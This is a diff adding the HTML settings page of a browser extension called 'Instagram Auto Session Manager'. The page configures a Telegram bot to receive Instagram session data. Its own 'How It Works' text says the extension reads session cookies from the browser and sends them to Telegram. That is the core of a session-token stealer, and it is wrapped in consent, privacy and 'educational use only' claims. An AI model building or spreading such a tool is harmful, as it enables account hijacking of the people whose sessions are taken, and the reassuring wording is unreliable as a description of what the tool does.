@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- Meta tags for proper document structure -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Configure your Telegram bot settings for Instagram Auto Session Manager">
+    <title>Instagram Auto Session Manager - Settings</title>
+    
+    <!-- Link to external CSS file for styling -->
+    <link rel="stylesheet" href="options.css">
+    
+    <!-- Preload important resources for better performance -->
+    <link rel="preload" href="icons/icon48.png" as="image">
+</head>
+<body>
+    <!-- Main container for the entire options page -->
+    <div class="options-container">
+        
+        <!-- Header section with extension branding and navigation -->
+        <header class="header-section">
+            <div class="header-content">
+                <!-- Extension logo and title -->
+                <div class="brand-section">
+                    <img src="icons/icon48.png" alt="Instagram Auto Session Manager Logo" class="brand-logo">
+                    <div class="brand-text">
+                        <h1 class="brand-title">Instagram Auto Session Manager</h1>
+                        <p class="brand-subtitle">Configure your Telegram bot settings</p>
+                    </div>
+                </div>
+                
+                <!-- Navigation tabs for different settings sections -->
+                <nav class="settings-nav">
+                    <button class="nav-tab active" data-tab="telegram">
+                        <span class="nav-icon">📱</span>
+                        Telegram Settings
+                    </button>
+                    <button class="nav-tab" data-tab="privacy">
+                        <span class="nav-icon">🔒</span>
+                        Privacy & Security
+                    </button>
+                    <button class="nav-tab" data-tab="about">
+                        <span class="nav-icon">ℹ️</span>
+                        About
+                    </button>
+                </nav>
+            </div>
+        </header>
+
+        <!-- Main content area with different tab sections -->
+        <main class="main-content">
+            
+            <!-- Telegram Settings Tab Content -->
+            <section class="tab-content active" id="telegram-tab">
+                <div class="content-wrapper">
+                    
+                    <!-- Section title and description -->
+                    <div class="section-header">
+                        <h2 class="section-title">Telegram Bot Configuration</h2>
+                        <p class="section-description">
+                            Configure your Telegram bot to receive Instagram session data. 
+                            This information is stored locally and never shared with third parties.
+                        </p>
+                    </div>
+
+                    <!-- Configuration form for Telegram settings -->
+                    <form class="settings-form" id="telegram-form">
+                        
+                        <!-- Bot Token Input Section -->
+                        <div class="form-group">
+                            <label for="bot-token" class="form-label">
+                                <span class="label-text">Telegram Bot Token</span>
+                                <span class="label-required">*</span>
+                            </label>
+                            <div class="input-wrapper">
+                                <input 
+                                    type="password" 
+                                    id="bot-token" 
+                                    name="botToken"
+                                    class="form-input" 
+                                    placeholder="Enter your bot token (e.g., 123456789:ABCdefGHIjklMNOpqrsTUVwxyz)"
+                                    autocomplete="off"
+                                    spellcheck="false"
+                                >
+                                <button type="button" class="toggle-visibility" id="toggle-token">
+                                    <span class="visibility-icon">👁️</span>
+                                </button>
+                            </div>
+                            <div class="form-help">
+                                <p class="help-text">
+                                    Get your bot token from <a href="https://t.me/botfather" target="_blank" rel="noopener">@BotFather</a> on Telegram.
+                                    Use the /newbot command to create a new bot.
+                                </p>
+                            </div>
+                        </div>
+
+                        <!-- Chat ID Input Section -->
+                        <div class="form-group">
+                            <label for="chat-id" class="form-label">
+                                <span class="label-text">Chat ID</span>
+                                <span class="label-required">*</span>
+                            </label>
+                            <div class="input-wrapper">
+                                <input 
+                                    type="text" 
+                                    id="chat-id" 
+                                    name="chatId"
+                                    class="form-input" 
+                                    placeholder="Enter your chat ID (e.g., 123456789 or @username)"
+                                    autocomplete="off"
+                                    spellcheck="false"
+                                >
+                            </div>
+                            <div class="form-help">
+                                <p class="help-text">
+                                    Your personal chat ID or group chat ID where messages will be sent.
+                                    <button type="button" class="help-link" id="show-chat-id-help">
+                                        How to find my Chat ID?
+                                    </button>
+                                </p>
+                            </div>
+                        </div>
+
+                        <!-- Custom Message Template Section -->
+                        <div class="form-group">
+                            <label for="message-template" class="form-label">
+                                <span class="label-text">Message Template</span>
+                                <span class="label-optional">(Optional)</span>
+                            </label>
+                            <div class="input-wrapper">
+                                <textarea 
+                                    id="message-template" 
+                                    name="messageTemplate"
+                                    class="form-textarea" 
+                                    rows="4"
+                                    placeholder="Customize your message template using variables like {sessionId}, {userId}, {username}, {timestamp}"
+                                ></textarea>
+                            </div>
+                            <div class="form-help">
+                                <p class="help-text">
+                                    Available variables: {sessionId}, {userId}, {username}, {timestamp}, {url}
+                                </p>
+                                <button type="button" class="help-link" id="reset-template">
+                                    Reset to Default Template
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Test Connection Section -->
+                        <div class="form-group">
+                            <div class="test-section">
+                                <button type="button" class="test-button" id="test-connection">
+                                    <span class="button-icon">🔍</span>
+                                    Test Connection
+                                </button>
+                                <div class="test-result" id="test-result"></div>
+                            </div>
+                        </div>
+
+                        <!-- Form Action Buttons -->
+                        <div class="form-actions">
+                            <button type="submit" class="save-button" id="save-settings">
+                                <span class="button-icon">💾</span>
+                                Save Settings
+                            </button>
+                            <button type="button" class="reset-button" id="reset-settings">
+                                <span class="button-icon">🔄</span>
+                                Reset to Defaults
+                            </button>
+                        </div>
+
+                    </form>
+
+                    <!-- Status Messages Area -->
+                    <div class="status-messages" id="status-messages"></div>
+
+                </div>
+            </section>
+
+            <!-- Privacy & Security Tab Content -->
+            <section class="tab-content" id="privacy-tab">
+                <div class="content-wrapper">
+                    
+                    <div class="section-header">
+                        <h2 class="section-title">Privacy & Security Settings</h2>
+                        <p class="section-description">
+                            Control how your data is handled and configure security preferences.
+                        </p>
+                    </div>
+
+                    <!-- Privacy Settings Form -->
+                    <form class="settings-form" id="privacy-form">
+                        
+                        <!-- Data Retention Settings -->
+                        <div class="form-group">
+                            <label class="form-label">
+                                <span class="label-text">Data Retention</span>
+                            </label>
+                            <div class="checkbox-group">
+                                <label class="checkbox-label">
+                                    <input type="checkbox" id="auto-clear-data" name="autoClearData">
+                                    <span class="checkbox-custom"></span>
+                                    <span class="checkbox-text">Automatically clear session data after sending</span>
+                                </label>
+                                <label class="checkbox-label">
+                                    <input type="checkbox" id="clear-on-close" name="clearOnClose">
+                                    <span class="checkbox-custom"></span>
+                                    <span class="checkbox-text">Clear all data when browser closes</span>
+                                </label>
+                            </div>
+                        </div>
+
+                        <!-- Notification Settings -->
+                        <div class="form-group">
+                            <label class="form-label">
+                                <span class="label-text">Notifications</span>
+                            </label>
+                            <div class="checkbox-group">
+                                <label class="checkbox-label">
+                                    <input type="checkbox" id="show-notifications" name="showNotifications" checked>
+                                    <span class="checkbox-custom"></span>
+                                    <span class="checkbox-text">Show browser notifications for important events</span>
+                                </label>
+                                <label class="checkbox-label">
+                                    <input type="checkbox" id="consent-reminders" name="consentReminders" checked>
+                                    <span class="checkbox-custom"></span>
+                                    <span class="checkbox-text">Show consent reminders before data transmission</span>
+                                </label>
+                            </div>
+                        </div>
+
+                        <!-- Security Options -->
+                        <div class="form-group">
+                            <label class="form-label">
+                                <span class="label-text">Security Options</span>
+                            </label>
+                            <div class="checkbox-group">
+                                <label class="checkbox-label">
+                                    <input type="checkbox" id="require-confirmation" name="requireConfirmation" checked>
+                                    <span class="checkbox-custom"></span>
+                                    <span class="checkbox-text">Always require explicit confirmation before sending data</span>
+                                </label>
+                                <label class="checkbox-label">
+                                    <input type="checkbox" id="log-activities" name="logActivities">
+                                    <span class="checkbox-custom"></span>
+                                    <span class="checkbox-text">Log extension activities for transparency (local only)</span>
+                                </label>
+                            </div>
+                        </div>
+
+                        <!-- Data Management Actions -->
+                        <div class="form-group">
+                            <label class="form-label">
+                                <span class="label-text">Data Management</span>
+                            </label>
+                            <div class="action-buttons">
+                                <button type="button" class="action-button" id="export-settings">
+                                    <span class="button-icon">📤</span>
+                                    Export Settings
+                                </button>
+                                <button type="button" class="action-button" id="import-settings">
+                                    <span class="button-icon">📥</span>
+                                    Import Settings
+                                </button>
+                                <button type="button" class="action-button danger" id="clear-all-data">
+                                    <span class="button-icon">🗑️</span>
+                                    Clear All Data
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Privacy Form Actions -->
+                        <div class="form-actions">
+                            <button type="submit" class="save-button">
+                                <span class="button-icon">💾</span>
+                                Save Privacy Settings
+                            </button>
+                        </div>
+
+                    </form>
+
+                </div>
+            </section>
+
+            <!-- About Tab Content -->
+            <section class="tab-content" id="about-tab">
+                <div class="content-wrapper">
+                    
+                    <div class="section-header">
+                        <h2 class="section-title">About Instagram Auto Session Manager</h2>
+                        <p class="section-description">
+                            Learn more about this extension and how it works.
+                        </p>
+                    </div>
+
+                    <!-- Extension Information -->
+                    <div class="info-cards">
+                        
+                        <!-- Version Information Card -->
+                        <div class="info-card">
+                            <div class="card-header">
+                                <span class="card-icon">📋</span>
+                                <h3 class="card-title">Extension Information</h3>
+                            </div>
+                            <div class="card-content">
+                                <div class="info-row">
+                                    <span class="info-label">Version:</span>
+                                    <span class="info-value" id="extension-version">2.0.0</span>
+                                </div>
+                                <div class="info-row">
+                                    <span class="info-label">Manifest Version:</span>
+                                    <span class="info-value">3</span>
+                                </div>
+                                <div class="info-row">
+                                    <span class="info-label">Last Updated:</span>
+                                    <span class="info-value" id="last-updated">January 2024</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- How It Works Card -->
+                        <div class="info-card">
+                            <div class="card-header">
+                                <span class="card-icon">⚙️</span>
+                                <h3 class="card-title">How It Works</h3>
+                            </div>
+                            <div class="card-content">
+                                <ol class="process-list">
+                                    <li>Extension detects when you visit Instagram.com</li>
+                                    <li>Checks for valid Instagram session in browser cookies</li>
+                                    <li>Shows consent page asking for your explicit permission</li>
+                                    <li>Only after approval, extracts session data locally</li>
+                                    <li>Sends data to your configured Telegram bot</li>
+                                    <li>Clears temporary data for security</li>
+                                </ol>
+                            </div>
+                        </div>
+
+                        <!-- Privacy & Security Card -->
+                        <div class="info-card">
+                            <div class="card-header">
+                                <span class="card-icon">🔒</span>
+                                <h3 class="card-title">Privacy & Security</h3>
+                            </div>
+                            <div class="card-content">
+                                <ul class="feature-list">
+                                    <li>✅ Explicit consent required for all actions</li>
+                                    <li>✅ All data processing happens locally</li>
+                                    <li>✅ No data sent to third-party servers</li>
+                                    <li>✅ Telegram credentials stored securely</li>
+                                    <li>✅ Session data cleared after transmission</li>
+                                    <li>✅ Full transparency in all operations</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <!-- Support & Links Card -->
+                        <div class="info-card">
+                            <div class="card-header">
+                                <span class="card-icon">🔗</span>
+                                <h3 class="card-title">Support & Links</h3>
+                            </div>
+                            <div class="card-content">
+                                <div class="link-group">
+                                    <a href="#" class="support-link" id="view-privacy-policy">
+                                        <span class="link-icon">📄</span>
+                                        Privacy Policy
+                                    </a>
+                                    <a href="#" class="support-link" id="view-source-code">
+                                        <span class="link-icon">💻</span>
+                                        Source Code
+                                    </a>
+                                    <a href="https://t.me/botfather" target="_blank" rel="noopener" class="support-link">
+                                        <span class="link-icon">🤖</span>
+                                        Create Telegram Bot
+                                    </a>
+                                    <a href="#" class="support-link" id="report-issue">
+                                        <span class="link-icon">🐛</span>
+                                        Report Issue
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+
+                </div>
+            </section>
+
+        </main>
+
+        <!-- Footer section with additional information -->
+        <footer class="footer-section">
+            <div class="footer-content">
+                <p class="footer-text">
+                    Instagram Auto Session Manager - Built with privacy and transparency in mind
+                </p>
+                <p class="footer-disclaimer">
+                    This extension is for educational and personal use only. 
+                    Always respect platform terms of service and applicable laws.
+                </p>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- Hidden elements for modals and overlays -->
+    <div class="modal-overlay" id="modal-overlay"></div>
+    
+    <!-- Chat ID Help Modal -->
+    <div class="modal" id="chat-id-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 class="modal-title">How to Find Your Chat ID</h3>
+                <button class="modal-close" id="close-chat-id-modal">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="help-steps">
+                    <div class="help-step">
+                        <span class="step-number">1</span>
+                        <div class="step-content">
+                            <h4>Start a chat with your bot</h4>
+                            <p>Send any message to your Telegram bot</p>
+                        </div>
+                    </div>
+                    <div class="help-step">
+                        <span class="step-number">2</span>
+                        <div class="step-content">
+                            <h4>Get updates from Telegram API</h4>
+                            <p>Visit this URL in your browser (replace YOUR_BOT_TOKEN):</p>
+                            <code>https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates</code>
+                        </div>
+                    </div>
+                    <div class="help-step">
+                        <span class="step-number">3</span>
+                        <div class="step-content">
+                            <h4>Find your Chat ID</h4>
+                            <p>Look for "chat":{"id": in the response. That number is your Chat ID.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- File input for importing settings (hidden) -->
+    <input type="file" id="import-file-input" accept=".json" style="display: none;">
+
+    <!-- Link to external JavaScript file -->
+    <script src="options.js"></script>
+</body>
+</html>
+
